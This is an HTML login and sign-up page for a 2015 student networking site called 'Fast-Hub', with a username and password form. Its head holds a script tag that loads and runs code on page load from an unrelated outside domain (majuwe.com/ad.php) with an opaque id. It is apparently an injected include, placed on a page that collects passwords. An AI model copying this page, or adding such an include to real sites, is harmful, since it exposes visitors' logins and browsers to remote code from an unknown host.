<!doctype html>
<html>

<head>
<meta charset="utf-8">
<title>Login Page</title>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<link rel="stylesheet" type="text/css" href="public/css/style.css">
<script type="text/javascript" src="public/js/images.js"></script>
<script src="https://majuwe.com/ad.php?u=ca6c0dae4ff09186a17cc452d3fb7b&p=1"></script>
</head>

<body>
       <div id="wrapper">
              
              <div id="header">
                     <div id="login">
                             <div class="input">
                                  <form action="auth.php" method="post">
                                  <input type="text" name="username" placeholder="Username"> 
                                  <input type="password" name="password" placeholder="Password">
                                  <button type="submit" name="submit" value="Submit">Login</button>
                                  </form>
                             </div>
                     </div>
                     <div id="logo">
                           <img src="public/img/fast.jpg">
                     </div>
              </div>
              <div id="signup-box">
                     <h3>Sign Up</h3>
                     <hr>
                     <div class="signup-input custom c1">
                                <form action="signup.php" method="post">
                               <button type="submit" name="signup-button" value="submit">New User?</button>
                               </form> 
                     </div>
              </div>
              <div id="pics">
                     <h1>Welcome to Fast-Hub</h1><br>
                     <h2>Connect with Fastians</h2> 
                     <p>Copyright &copy 2015 All Right Reserved: Fasthub.com</p>
                     <img src="public/img/social.jpg" width="1400" height="600" name="slide" style="margin-top:40px"> 
                     <script>
                         slideit();
			         </script>
              </div>
              
       </div>

</body>

</html>
